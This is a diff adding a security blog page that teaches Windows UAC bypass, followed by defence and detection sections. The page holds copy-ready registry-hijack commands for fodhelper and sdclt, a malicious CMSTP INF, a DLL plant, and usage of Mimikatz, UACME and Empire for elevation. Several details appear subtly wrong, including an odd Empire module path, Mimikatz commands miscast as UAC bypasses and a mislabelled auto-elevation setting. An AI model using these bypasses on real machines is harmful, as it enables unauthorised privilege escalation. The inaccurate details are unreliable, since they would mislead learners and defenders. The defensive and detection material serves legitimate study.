@@ -1,0 +1,371 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <title>UAC Bypass | Saikumar Infosec</title>
+  <link href="https://fonts.googleapis.com/css2?family=Inter:wght@300;400;500;600;700;800&display=swap" rel="stylesheet">
+  <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.5.1/css/all.min.css">
+  <link rel="stylesheet" href="../core/styles/core.css">
+  <style>
+    .page-header { padding: 4rem 0 2rem; }
+    .breadcrumb { margin-bottom: 1rem; color: var(--text-secondary); font-size: 0.85rem; display: flex; gap: 0.5rem; flex-wrap: wrap; }
+    .breadcrumb a { color: var(--primary); text-decoration: none; }
+    .severity-badge { display: inline-block; padding: 0.5rem 1rem; border-radius: 40px; font-size: 0.75rem; font-weight: 600; margin-bottom: 1rem; }
+    .severity-high { background: rgba(255,136,0,0.2); color: #ff8800; }
+    .meta-grid { display: grid; grid-template-columns: repeat(auto-fit, minmax(180px, 1fr)); gap: 1rem; margin: 1.5rem 0; padding: 1rem; background: var(--bg-card); border: 1px solid var(--border); border-radius: 0.75rem; }
+    .meta-item { padding: 0.5rem; }
+    .meta-item strong { display: block; color: var(--primary); margin-bottom: 0.25rem; font-size: 0.7rem; text-transform: uppercase; }
+    .meta-item span { color: var(--text-secondary); font-size: 0.85rem; }
+    .content-section { margin: 2rem 0; }
+    .content-section h2 { font-size: 1.4rem; margin: 2rem 0 1rem; color: var(--primary); border-left: 3px solid var(--primary); padding-left: 1rem; font-weight: 600; }
+    .content-section p { margin: 0.75rem 0; color: var(--text-secondary); line-height: 1.7; }
+    .content-section ul, .content-section ol { margin: 1rem 0; padding-left: 1.5rem; color: var(--text-secondary); }
+    .content-section li { margin: 0.5rem 0; line-height: 1.6; }
+    .content-section code { background: var(--bg-elevated); padding: 2px 6px; border-radius: 4px; color: var(--primary); font-family: 'Courier New', monospace; font-size: 0.9em; }
+    .code-block { background: var(--bg-card); border: 1px solid var(--border); border-radius: 0.75rem; padding: 1.2rem; margin: 1.5rem 0; overflow-x: auto; font-family: 'Courier New', monospace; font-size: 0.8rem; color: var(--primary); position: relative; }
+    .code-block pre { margin: 0; white-space: pre-wrap; word-wrap: break-word; }
+    .copy-btn { position: absolute; top: 0.5rem; right: 0.5rem; background: var(--bg-elevated); border: 1px solid var(--border); padding: 0.4rem 0.8rem; border-radius: 4px; cursor: pointer; color: var(--text-secondary); font-size: 0.75rem; transition: var(--transition); }
+    .copy-btn:hover { color: var(--primary); background: var(--bg-card); }
+    .back-link { display: inline-flex; align-items: center; gap: 0.5rem; margin-top: 2rem; color: var(--primary); text-decoration: none; }
+    .back-link:hover { text-decoration: underline; }
+    .vulnerability-box { background: rgba(255,68,68,0.1); border-left: 4px solid #ff4444; padding: 1rem; border-radius: 0.5rem; margin: 1rem 0; }
+    .vulnerability-box strong { color: #ff4444; }
+    .mitigation-box { background: rgba(0,245,160,0.1); border-left: 4px solid var(--primary); padding: 1rem; border-radius: 0.5rem; margin: 1rem 0; }
+    .mitigation-box strong { color: var(--primary); }
+    .info-box { background: rgba(79,140,255,0.1); border-left: 4px solid #4f8cff; padding: 1rem; border-radius: 0.5rem; margin: 1rem 0; }
+    .info-box strong { color: #4f8cff; }
+    @media (max-width: 768px) { .meta-grid { grid-template-columns: 1fr; } }
+  </style>
+</head>
+<body>
+<nav class="navbar">
+  <div class="container nav-flex">
+    <a href="../index.html" class="logo">Saikumar<span>.Infosec</span></a>
+    <button class="mobile-menu" id="mobileMenuBtn"><i class="fas fa-bars"></i></button>
+    <ul class="nav-links" id="navLinks">
+      <li><a href="../index.html">Home</a></li>
+      <li><a href="index.html">Windows Security</a></li>
+      <li><a href="../index.html#contact">Contact</a></li>
+      <li><button class="theme-toggle" id="themeToggle"><i class="fas fa-moon"></i> <span>Dark</span></button></li>
+    </ul>
+  </div>
+</nav>
+<main>
+  <div class="container">
+    <div class="breadcrumb">
+      <a href="../index.html">Home</a> / <a href="index.html">Windows Security</a> / UAC Bypass
+    </div>
+    <div class="page-header">
+      <span class="severity-badge severity-high"><i class="fas fa-exclamation-triangle"></i> High Severity | T1548.002</span>
+      <h1>🔓 UAC Bypass Techniques</h1>
+      <div class="meta-grid">
+        <div class="meta-item"><strong>MITRE</strong><span>T1548.002</span></div>
+        <div class="meta-item"><strong>Platform</strong><span>Windows 7-11</span></div>
+        <div class="meta-item"><strong>Phase</strong><span>Privilege Escalation</span></div>
+        <div class="meta-item"><strong>Difficulty</strong><span>Medium</span></div>
+      </div>
+    </div>
+    <div class="content-section" id="description">
+      <h2>🧠 Description</h2>
+      <p>User Account Control (UAC) is a Windows security feature that requires user confirmation before allowing elevated (administrator) tasks. UAC bypass techniques exploit implementation flaws in Windows components to execute code with elevated privileges without user consent.</p>
+      <div class="vulnerability-box">
+        <strong>Why UAC Bypass Works:</strong>
+        <ul>
+          <li><strong>Auto-Elevation:</strong> Trusted Windows binaries can auto-elevate without consent</li>
+          <li><strong>DLL Hijacking:</strong> High-integrity processes load DLLs from writable locations</li>
+          <li><strong>Registry Exploitation:</strong> COM objects with vulnerable implementations</li>
+          <li><strong>Token Manipulation:</strong> Duplicating elevated tokens via COM abuse</li>
+        </ul>
+      </div>
+      <p><strong>UAC Integrity Levels:</strong></p>
+      <ul>
+        <li><strong>Low:</strong> Internet Explorer, sandboxed apps</li>
+        <li><strong>Medium:</strong> Standard user processes</li>
+        <li><strong>High:</strong> Administrator with UAC prompt</li>
+        <li><strong>System:</strong> NT AUTHORITY\SYSTEM</li>
+      </ul>
+    </div>
+    <div class="content-section" id="enumeration">
+      <h2>🔍 UAC Enumeration</h2>
+      <p><strong>Check Current UAC Status:</strong></p>
+      <div class="code-block">
+        <button class="copy-btn" onclick="copyCode(this)">Copy</button>
+        <pre># Check UAC enabled
+REG QUERY HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System
+
+# Check LocalAccountTokenFilterPolicy (1 = admin logs in as medium)
+REG QUERY HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System /v LocalAccountTokenFilterPolicy
+
+# Check FilterAdministratorToken (enables admin for RDP)
+REG QUERY HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System /v FilterAdministratorToken
+
+# Check if current user is admin
+net user %username%
+whoami /groups | findstr Admin
+
+# Check integrity level
+whoami /all | findstr Mandatory</pre>
+      </div>
+      <p><strong>Check Auto-Elevate Applications:</strong></p>
+      <div class="code-block">
+        <button class="copy-btn" onclick="copyCode(this)">Copy</button>
+        <pre># Check which binaries auto-elevate
+REG QUERY "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File Execution Options"
+
+# Check Environment variables PATH for writable directories
+reg query "HKLM\SYSTEM\CurrentControlSet\Control\Session Manager\Environment"
+
+# Check for World-writable system directories
+icacls C:\Windows\Temp
+icacls %TEMP%
+
+# Check scheduled tasks
+schtasks /query /fo LIST /v | findstr /i "Highest"</pre>
+      </div>
+    </div>
+    <div class="content-section" id="techniques">
+      <h2>💣 Bypass Techniques</h2>
+      <p><strong>1. fodhelper.exe (Registry Key Manipulation):</strong></p>
+      <div class="code-block">
+        <button class="copy-btn" onclick="copyCode(this)">Copy</button>
+        <pre># Create registry key for auto-elevated binary
+REG ADD "HKCU\Software\Classes\ms-settings\Shell\Open\command" /ve /d "cmd.exe" /f
+REG ADD "HKCU\Software\Classes\ms-settings\Shell\Open\command" /v "DelegateExecute" /d "" /f
+
+# Execute the auto-elevated binary
+ fodhelper.exe
+
+# Cleanup
+REG DELETE "HKCU\Software\Classes\ms-settings" /f</pre>
+      </div>
+      <p><strong>2. sdclt.exe (Controls Sound):</strong></p>
+      <div class="code-block">
+        <button class="copy-btn" onclick="copyCode(this)">Copy</button>
+        <pre># Another registry-based bypass
+REG ADD "HKCU\Software\Microsoft\Windows\CurrentVersion\App Paths\control.exe" /ve /d "cmd.exe" /f
+REG ADD "HKCU\Software\Microsoft\Windows\CurrentVersion\App Paths\control.exe" /v "Path" /d "C:\Windows\System32" /f
+
+# Execute
+sdclt.exe
+
+# Cleanup
+REG DELETE "HKCU\Software\Microsoft\Windows\CurrentVersion\App Paths\control.exe" /f</pre>
+      </div>
+      <p><strong>3. eventvwr.exe (Weak Binary Path):</strong></p>
+      <div class="code-block">
+        <button class="copy-btn" onclick="copyCode(this)">Copy</button>
+        <pre># Check if eventvwr.exe loads a DLL from writable path
+where eventvwr.exe
+icacls C:\Windows\System32\eventvwr.exe
+
+# If MMC.exe is auto-elevated and loads something from writable path
+# Place your DLL there
+
+# Example: mmc.exe loads bginfo.dll from current directory
+copy evil.dll C:\Windows\System32\bginfo.dll</pre>
+      </div>
+      <p><strong>4. CMSTP.exe (INF File):</strong></p>
+      <div class="code-block">
+        <button class="copy-btn" onclick="copyCode(this)">Copy</button>
+        <pre># Create malicious INF file
+[version]
+Signature=$chicago$
+[DefaultInstall]
+CustomDestinationProvider=CmCustom
+
+[CmCustom]
+runhlp.exe=c:\windows\system32\cmd.exe</pre>
+      </div>
+      <p><strong>5. DiskCleanup Scheduled Task (Registry):</strong></p>
+      <div class="code-block">
+        <button class="copy-btn" onclick="copyCode(this)">Copy</button>
+        <pre># Register new command
+REG ADD "HKCU\Software\Microsoft\Windows\CurrentVersion\Actions" /ve /d "calc" /f
+REG ADD "HKCU\Software\Microsoft\Windows\CurrentVersion\Actions" /v "Level" /d "1" /f
+
+# Execute disk cleanup as high integrity
+cleanmgr.exe /d C:
+
+# Cleanup
+REG DELETE "HKCU\Software\Microsoft\Windows\CurrentVersion\Actions" /f</pre>
+      </div>
+    </div>
+    <div class="content-section" id="mimikatz">
+      <h2>🔐 Using Known UAC Bypass Tools</h2>
+      <p><strong>Mimikatz Bypass Module:</strong></p>
+      <div class="code-block">
+        <button class="copy-btn" onclick="copyCode(this)">Copy</button>
+        <pre># Mimikatz has built-in UAC bypasses
+mimikatz.exe
+privilege::debug
+misc::misc
+# Or use elev module
+misc::elevate
+
+# Modern UAC bypass (token)
+token::elevate /domainadmin
+
+# Use ask module (creates prompt in high integrity)
+ask</pre>
+      </div>
+      <p><strong>UACME Tool:</strong></p>
+      <div class="code-block">
+        <button class="copy-btn" onclick="copyCode(this)">Copy</button>
+        <pre># UACME has multiple bypass methods
+# Download from GitHub: hxxps://github.com/hfiref0x/UACME
+
+# Method 33 (fodhelper)
+Akagi64.exe 33
+
+# Method 59 (slui)
+Akagi64.exe 59
+
+# Method 91 (eventvwr)
+Akagi64.exe 91
+
+# Execute custom payload
+Akagi64.exe 33 C:\Windows\System32\cmd.exe</pre>
+      </div>
+      <p><strong>Empire/Covenant:</strong></p>
+      <div class="code-block">
+        <button class="copy-btn" onclick="copyCode(this)">Copy</button>
+        <pre># Empire UAC bypass module
+usemodule pruvian/credential_injection/invoke_uac_bypass
+execute
+
+# Covenant UAC bypass
+Task /uac-bypass
+# Select method and payload</pre>
+      </div>
+    </div>
+    <div class="content-section" id="defense">
+      <h2>🛡️ Defense Against UAC Bypass</h2>
+      <p><strong>Disable Auto-Elevation:</strong></p>
+      <div class="code-block">
+        <button class="copy-btn" onclick="copyCode(this)">Copy</button>
+        <pre># Enable UAC for all applications
+# Computer Configuration > Policies > Windows Settings > Security Settings >
+# Local Policies > Security Options > User Account Control: Behavior of the elevation prompt
+
+# Set to "Prompt for consent on the secure desktop" or higher
+
+# Disable auto-elevation for all
+Set-ItemProperty -Path "HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System" -Name "EnableInstallerDetection" -Value 1
+
+# Enable secure desktop for prompts
+Set-ItemProperty -Path "HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System" -Name "PromptOnSecureDesktop" -Value 1</pre>
+      </div>
+      <p><strong>Remove Users from Local Admin Group:</strong></p>
+      <div class="code-block">
+        <button class="copy-btn" onclick="copyCode(this)">Copy</button>
+        <pre># Best defense is to not be admin
+# Remove all users from Administrators group
+Remove-LocalGroupMember -Group "Administrators" -Member "DOMAIN\User"
+
+# Add separate admin account for elevation
+Add-LocalGroupMember -Group "Administrators" -Member "DOMAIN\SpecialAdmin"
+
+# Enable Remote UAC
+REG ADD "HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System" /v LocalAccountTokenFilterPolicy /t REG_DWORD /d 0 /f</pre>
+      </div>
+    </div>
+    <div class="content-section" id="detection">
+      <h2>🔍 Detection</h2>
+      <p><strong>Sysmon Event Monitoring:</strong></p>
+      <div class="code-block">
+        <button class="copy-btn" onclick="copyCode(this)">Copy</button>
+        <pre># Monitor for UAC bypass artifacts
+# Event ID 1 - Process Create
+# Look for:
+# - eventvwr.exe, fodhelper.exe, sdclt.exe from user directories
+# - Registry modifications to HKCU\Software\Classes
+# - child processes of auto-elevated binaries
+
+# Sysmon config for UAC bypass
+<ProcessCreate>
+  <Image condition="endswith">eventvwr.exe</Image>
+  <ParentImage condition="endswith">explorer.exe</ParentImage>
+</ProcessCreate>
+
+<RegistryEvent>
+  <Target object="HKCU\Software\Classes\*\shell\open\command" />
+</RegistryEvent></pre>
+      </div>
+      <p><strong>Sigma Rules:</strong></p>
+      <div class="code-block">
+        <button class="copy-btn" onclick="copyCode(this)">Copy</button>
+        <pre>title: UAC Bypass via Registry
+id: uac-bypass-registry
+detection:
+  selection:
+    EventID: 13
+    TargetObject|contains: 
+      - 'ms-settings'
+      - 'Software\Classes'
+  condition: selection
+level: high</pre>
+      </div>
+      <p><strong>PowerShell Detection:</strong></p>
+      <div class="code-block">
+        <button class="copy-btn" onclick="copyCode(this)">Copy</button>
+        <pre># Check for suspicious registry entries
+Get-ItemProperty "HKCU:\Software\Classes\*\shell\open\command" -ErrorAction SilentlyContinue
+Get-ItemProperty "HKCU:\Software\Classes\ms-settings\Shell\Open\command" -ErrorAction SilentlyContinue
+
+# Monitor for new autorun entries
+Get-WmiObject -Class Win32_StartupCommand | Select-Object Name, Command</pre>
+      </div>
+    </div>
+    <div class="content-section" id="impact">
+      <h2>💥 Impact</h2>
+      <div class="vulnerability-box">
+        <strong>Potential Damage:</strong>
+        <ul>
+          <li><strong>System-Level Access:</strong> Bypass UAC to get SYSTEM shell</li>
+          <li><strong>Credential Dumping:</strong> Access LSASS, SAM database</li>
+          <li><strong>Persistence:</strong> Create high-integrity backdoors</li>
+          <li><strong>Defense Evasion:</strong> No user prompt alerts attacker</li>
+        </ul>
+      </div>
+    </div>
+    <div class="content-section" id="references">
+      <h2>📚 References</h2>
+      <ul>
+        <li><a href="https://github.com/hfiref0x/UACME" target="_blank">UACME - UAC Bypass Tool</a></li>
+        <li><a href="https://github.com/gentilkiwi/mimikatz" target="_blank">Mimikatz</a></li>
+        <li><a href="https://www.elastic.co/blog/understanding-detecting-uac-bypass-techniques" target="_blank">UAC Bypass Detection</a></li>
+        <li><a href="https://docs.microsoft.com/en-us/windows/security/identity-protection/user-account-control" target="_blank">UAC Documentation</a></li>
+      </ul>
+    </div>
+    <a href="index.html" class="back-link"><i class="fas fa-arrow-left"></i> Back to Windows Security</a>
+  </div>
+</main>
+<footer class="footer">
+  <div class="container">
+    <p>Saikumar Raju | Offensive Security Knowledge Base</p>
+    <p>Always test in authorized environments only.</p>
+  </div>
+</footer>
+<script>
+document.addEventListener('DOMContentLoaded', function() {
+  const mobileBtn = document.getElementById('mobileMenuBtn');
+  const navLinks = document.getElementById('navLinks');
+  if (mobileBtn) { mobileBtn.addEventListener('click', () => navLinks.classList.toggle('show')); }
+  const themeToggle = document.getElementById('themeToggle');
+  if (themeToggle) {
+    themeToggle.addEventListener('click', () => {
+      document.body.classList.toggle('light');
+      const icon = themeToggle.querySelector('i');
+      const text = themeToggle.querySelector('span');
+      if (document.body.classList.contains('light')) { icon.classList.remove('fa-moon'); icon.classList.add('fa-sun'); text.textContent = 'Light'; }
+      else { icon.classList.remove('fa-sun'); icon.classList.add('fa-moon'); text.textContent = 'Dark'; }
+      localStorage.setItem('theme-preference', document.body.classList.contains('light') ? 'light' : 'dark');
+    });
+  }
+  if (localStorage.getItem('theme-preference') === 'light') document.body.classList.add('light');
+});
+function copyCode(btn) { const code = btn.parentElement.querySelector('pre').innerText; navigator.clipboard.writeText(code); btn.textContent = 'Copied!'; setTimeout(() => { btn.textContent = 'Copy'; }, 2000); }
+</script>
+</body>
+</html>
